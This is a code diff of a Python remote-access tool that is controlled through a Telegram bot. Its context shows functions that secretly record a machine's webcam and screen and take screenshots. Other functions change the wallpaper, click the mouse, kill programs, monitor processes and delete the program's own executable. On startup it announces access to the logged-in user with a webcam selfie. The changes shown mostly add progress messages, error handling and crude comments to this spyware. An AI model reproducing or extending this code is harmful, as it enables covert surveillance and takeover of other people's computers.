@@ -1080,7 +1080,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def clear(self) -> None:
         self.closecap()
-        map(remove, listdir(BURN_DIRECTORY))
+        for file in listdir(BURN_DIRECTORY):
+            try:
+                if isfile(file):
+                    remove(file)
+            except:
+                pass#ignore file errors
         destroyAllWindows()
         self.audio_mixer.mute()
         #self.restore_wallpaper()
@@ -1998,6 +2003,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"Error while recording webcam {e}")
         bar.fill_and_delete()
 
+    #This code is like an impressive skycraper held by a little wire.
+
     def record_webcam_and_screen(self, capture_duration: int=10, caption: str|None=None) -> None:
         capture_duration = int(capture_duration)
         bar = self.new_loading_bar(capture_duration, label=f"{emoji_dict['photo']}{emoji_dict['screen']} Recording Webcam&Screen")
@@ -2037,7 +2044,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             video_clip = VideoFileClip(filename)
             audio_clip = AudioFileClip(audio_filename)
             video_with_audio = video_clip.set_audio(audio_clip)
-            final_filename = filename.replace(".mp4", "_final.mp4")
+            final_filename = filename.replace(".mp4", "_final.mp4")      #this was torture
             video_with_audio.write_videofile(final_filename, logger=None)#someone must pay for this
             tmploadingmessage = self.new_editable_message("Sending recording...", True)
             with open(final_filename, "rb") as video:
@@ -2062,7 +2069,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         change_wallpaper(self.backup_wallpaper_path)
 
     def rightclick(self) -> None:
-        pg.rightClick()
+        pg.rightClick() #no shit
 
     def screenshot(self) -> int:
         try:
@@ -2138,7 +2145,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         else:
             self.bsend(f"Volume must be from 0.0 to 100.0")
 
-    def setvideowallpaper(self, videofilename: str):
+    def setvideowallpaper(self, videofilename: str) -> None:
         res = True
         filename = join(BURN_DIRECTORY, "jxframe.png")
         backup_filename = join(BURN_DIRECTORY, "backup.png")
@@ -2169,6 +2176,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             sh_file = join(temp_dir, "delete_me.sh")
             with open(sh_file, "w") as f:
                 f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
+                # :(
             chmod(sh_file, 0o700)
             Popen(['sh', sh_file]) 
         self.bsend(f"🛑 Removing executable.")
@@ -2266,27 +2274,43 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return tmp
 
     def start(self) -> None:
+        STARTING_LOG_MESSAGE = self.new_editable_message("STARTING")
         #Getting rid of old shi
         try:
             self.bot.deleteWebhook()
         except MaxRetryError:
             #don't care
             ...
+        STARTING_LOG_MESSAGE.edit("DELETED WEBHOOK")
+
         self.bot.getUpdates()
+        STARTING_LOG_MESSAGE.edit("GOT UPDATES")
+
         self.images = load_images()
+        STARTING_LOG_MESSAGE.edit("GOT IMAGES")
+
         self.update_commands()
+        STARTING_LOG_MESSAGE.edit("GOT COMMANDS")
+
         nomemes = list(self.images.copy().keys())
         self.nomemes = list(filter(lambda x: x.startswith("jmp"), nomemes))
+
         self.audios = load_audios()
+        STARTING_LOG_MESSAGE.edit("AUDIOS LOADED")
+
         self.backup_wallpaper_path = join(BURN_DIRECTORY, get_current_wallpaper())
+        STARTING_LOG_MESSAGE.edit("WALLPAPER BACKED UP")
 
         self.cantopenthread = Thread(target=self.cantopenkiller)
         self.cantopenthread.start()
+        STARTING_LOG_MESSAGE.edit("PROGRAM KILLER STARTED")
 
         self.processmonthread = Thread(target=self.processmonitorloop)
         self.processmonthread.start()
+        STARTING_LOG_MESSAGE.edit("PROCESS MONITOR STARTED")
 
         self.screen_width, self.screen_height = pg.size()
+        STARTING_LOG_MESSAGE.edit("GOT SCREEN SIZE")
         botstartedmessage = f"Bot started now, you have acces to 👤{getlogin()}"
         if not sys.argv[1:]:
             if not self.selfie(botstartedmessage, reply_markup=self.replyquickmenu()):
@@ -2295,6 +2319,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())
         loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
         loop.run_as_thread()
+        STARTING_LOG_MESSAGE.edit("STARTED MESSAGE LOOP")
+        STARTING_LOG_MESSAGE.delete() #Weeeeeeeeeeeee
         while self.running:
             try:
                 sleep(1)
@@ -2373,4 +2399,5 @@ if __name__ == "__main__":
     except Exception as e:
         signal_error += f"Unhandled exception: {e}"
     pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"])
+    # I wanted to make this multiple user but there is no way I'm rewriting all that shit.
     pep2.start()
